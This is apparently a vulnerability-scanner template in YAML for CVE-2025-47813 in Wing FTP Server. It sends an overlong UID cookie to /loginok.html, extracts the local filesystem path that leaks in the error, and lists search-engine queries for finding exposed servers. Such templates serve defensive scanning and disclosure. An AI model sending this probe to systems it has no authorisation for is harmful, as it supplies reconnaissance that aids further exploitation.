http:
- body: username=anonymous&password=test
  extractors:
  - part: body
    regex:
    - ([a-zA-Z]:[\\/][^A\r\n]{10,})
    type: regex
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: UID={{longuid}}
  matchers:
  - condition: or
    part: body
    type: word
    words:
    - Server Path
    - Error
    - :\\
    - /usr/
  - part: header
    type: word
    words:
    - Wing FTP Server
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/loginok.html'
id: CVE-2025-47813
info:
  author: rcesecurity,pdteam
  classification:
    cve-id: CVE-2025-47813
    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:NH
    cvss-score: 5.3
    cwe-id: CWE-209
    epss-percentile: 0.68054
    epss-score: 0.00576
  description: "Wing FTP Server versions prior to 7.4.4 are vulnerable to an authenticated\
    \ information disclosure vulnerability (CVE-2025-47813).\nThe vulnerability occurs\
    \ due to improper validation of the 'UID' session cookie in the /loginok.html\
    \ endpoint. Supplying an\noverlong UID value causes the server to respond with\
    \ an error that includes the full local filesystem path. This can aid in further\n\
    exploitation (e.g., CVE-2025-47812) by revealing the application\u2019s file system\
    \ layout.\n"
  impact: 'Authenticated attackers can supply an overlong UID cookie value to trigger
    error responses that disclose the full local filesystem path, aiding in further
    exploitation attempts.

    '
  metadata:
    fofa-query:
    - icon_hash="963565804"
    - title="Wing FTP Server"
    product: wftpserver
    shodan-query:
    - http.html_hash:2121146066
    - http.favicon.hash:963565804
    - title:"Wing FTP Server"
    - 'Server: Wing FTP Server'
    vendor: wing_ftp_server
    verified: false
    zoomeye-query:
    - app="Wing FTP Server"
  name: Wing FTP Server <= 7.4.3 - Path Disclosure via Overlong UID Cookie
  reference:
  - https://www.rcesecurity.com/2025/06/what-the-null-wing-ftp-server-rce-cve-2025-47812/
  - https://www.wftpserver.com
  remediation: 'Upgrade Wing FTP Server to version 7.4.4 or later that properly validates
    UID cookie values.

    '
  severity: medium
  tags: cve,cve2025,wingftp,unauth,exposure,vuln
variables:
  longuid: '{{repeat(''A'', 2048)}}'
